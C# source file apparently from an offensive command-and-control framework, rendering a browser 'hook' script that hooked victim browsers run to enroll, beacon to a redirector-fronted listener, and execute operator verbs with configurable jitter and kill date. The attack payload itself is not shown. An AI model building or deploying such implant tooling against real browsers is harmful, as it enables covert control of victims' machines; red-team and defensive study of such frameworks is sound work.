using System.Text;
using System.Text.Json;
using Rod.CoreState.Assets;

namespace Rod.Transport.Hooks;

/// <summary>
/// The bake a hook mint renders into the served script: where the hooked
/// browser contacts, the credential it redeems, the seal it carries, the
/// cadence it polls at, and the verbs it may run. Everything the hook knows
/// about its deployment lives in the bake -- the template itself is
/// deployment-free.
/// </summary>
/// <param name="EnrollUrl">
/// The enroll route on the listener's public endpoint, what a victim's
/// browser can reach (the redirector-fronted edge, not the bind).
/// </param>
/// <param name="BeaconUrl">The envelope contact route on the same endpoint.</param>
/// <param name="TokenSecret">
/// The deploy token the mint baked; each hooked browser's enrollment spends
/// one use of it, so the mint's budget is the enrollment budget.
/// </param>
/// <param name="BakedKey">
/// The packed envelope key (<c>base64(keyId || key)</c>, the
/// <see cref="Payloads.AesGcmEnvelope.Bake"/> form) in the sealed posture;
/// null in the cleartext posture, where nothing seals and nothing keys.
/// </param>
/// <param name="Verbs">The Browser class's reduced verb set.</param>
/// <param name="JitterSeconds">The jitter half-width around the interval.</param>
/// <param name="Verbs">The Browser class's reduced verb set.</param>
/// <param name="SleepSeconds">The poll cadence's base interval.</param>
/// <param name="JitterSeconds">The jitter half-width around the interval.</param>
/// <param name="KillDate">
/// The baked time fuse as RFC 3339, or null on an open-ended mint.
/// </param>
public sealed record BrowserHookBake(
    string EnrollUrl,
    string BeaconUrl,
    string TokenSecret,
    string? BakedKey,
    IReadOnlyCollection<string> Verbs,
    double SleepSeconds,
    double JitterSeconds,
    string? KillDate);

/// <summary>
/// Renders the browser hook script (architecture.md Sec 5.2, Sec 8): the
/// hook asset module's template with one bake substituted. The template
/// itself lives in the module layer -- <c>browser-hook</c>, asset
/// <c>hook</c> (Sec 15.1) -- and reaches the mint through
/// <see cref="IModuleAssetStore"/>; what stays here is the render contract
/// both sides share: the template carries the
/// <c>__ROD_BAKE_JSON__</c> placeholder exactly once, and the substitution
/// is one compact camelCase JSON object, so a served hook is reviewable as
/// "the template plus this bake" and nothing else.
/// </summary>
public static class BrowserHookScript
{
    /// <summary>
    /// The asset module the mint's template lives in -- the naming contract
    /// this class and the module's manifest share, the way a verb string
    /// binds a capability's two halves. A different hook module (one chasing
    /// a browser the reference template does not) ships under the same
    /// module name and wins by the asset host's last-listed rule.
    /// </summary>
    public const string TemplateModuleName = "browser-hook";

    /// <summary>The asset name the mint resolves inside the module.</summary>
    public const string TemplateAssetName = "hook";

    /// <summary>
    /// The placeholder the template defines exactly once and the render
    /// substitutes once -- the whole of the module-side format contract.
    /// </summary>
    public const string Placeholder = "__ROD_BAKE_JSON__";

    private static readonly JsonSerializerOptions BakeJson = new()
    {
        // The template reads camelCase keys (enrollUrl, beaconUrl, ...) --
        // the shape every wire-side JSON document in the codebase carries.
        PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
    };

    /// <summary>
    /// Renders the hook for <paramref name="bake"/> over
    /// <paramref name="template"/>. The substitution is total: a template
    /// that lost its placeholder fails here rather than serving an
    /// unconfigured hook.
    /// </summary>
    public static byte[] Render(byte[] template, BrowserHookBake bake)
    {
        var text = Encoding.UTF8.GetString(template);
        if (!text.Contains(Placeholder))
            throw new InvalidOperationException(
                $"The hook template from module '{TemplateModuleName}' no longer carries its bake placeholder.");

        var json = JsonSerializer.Serialize(
            new
            {
                bake.EnrollUrl,
                bake.BeaconUrl,
                token = bake.TokenSecret,
                bakedKey = bake.BakedKey,
                bake.Verbs,
                sleep = bake.SleepSeconds,
                jitter = bake.JitterSeconds,
                killDate = bake.KillDate,
            },
            BakeJson);

        return Encoding.UTF8.GetBytes(text.Replace(Placeholder, json));
    }
}
